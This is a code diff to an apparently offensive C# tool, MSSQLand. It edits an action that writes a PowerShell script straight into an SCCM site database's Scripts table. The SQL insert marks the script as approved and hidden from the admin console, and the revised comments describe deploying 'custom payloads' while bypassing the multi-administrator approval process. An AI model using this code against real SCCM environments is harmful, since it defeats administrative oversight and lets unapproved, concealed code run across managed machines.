@@ -7,8 +7,12 @@ using System.Text;
 namespace MSSQLand.Actions.SCCM
 {
     /// <summary>
-    /// Add a PowerShell script to the SCCM Scripts table.
-    /// Automatically approves the script and hides it from the admin console.
+    /// Upload a PowerShell script to SCCM's Scripts table for later execution via sccm-script-run.
+    /// Use this to deploy custom payloads or administrative scripts without admin console approval workflow.
+    /// Automatically sets script to approved state and hides it from console UI.
+    /// Generates unique GUID for script identification or accepts custom GUID.
+    /// Bypasses normal script approval process requiring multiple administrator roles.
+    /// Returns script GUID needed for sccm-script-run command.
     /// </summary>
     internal class SccmScriptAdd : BaseAction
     {
@@ -93,15 +97,15 @@ namespace MSSQLand.Actions.SCCM
                     // Calculate SHA256 hash
                     string scriptHash = Misc.ComputeSHA256(scriptBytes);
 
-                        string insertQuery = $@"
+                    string insertQuery = $@"
 INSERT INTO [{db}].dbo.Scripts 
 (ScriptGuid, ScriptVersion, ScriptName, Script, ScriptType, Approver, ApprovalState, Feature, Author, LastUpdateTime, ScriptHash, Comment, ScriptDescription) 
 VALUES 
 ('{_scriptGuid}', 1, '{_scriptName.Replace("'", "''")}', 0x{scriptHex}, 0, 'CM', 3, 1, 'CM', '', '{scriptHash}', '', '')";
 
-                        databaseContext.QueryService.ExecuteNonProcessing(insertQuery);
+                    databaseContext.QueryService.ExecuteNonProcessing(insertQuery);
 
-                        Logger.Success($"Script added successfully");
+                    Logger.Success($"Script added successfully");
                     Logger.InfoNested($"Script GUID: {_scriptGuid}");
                     Logger.InfoNested($"Script Name: {_scriptName}");
                     Logger.InfoNested($"Script Hash: {scriptHash}");
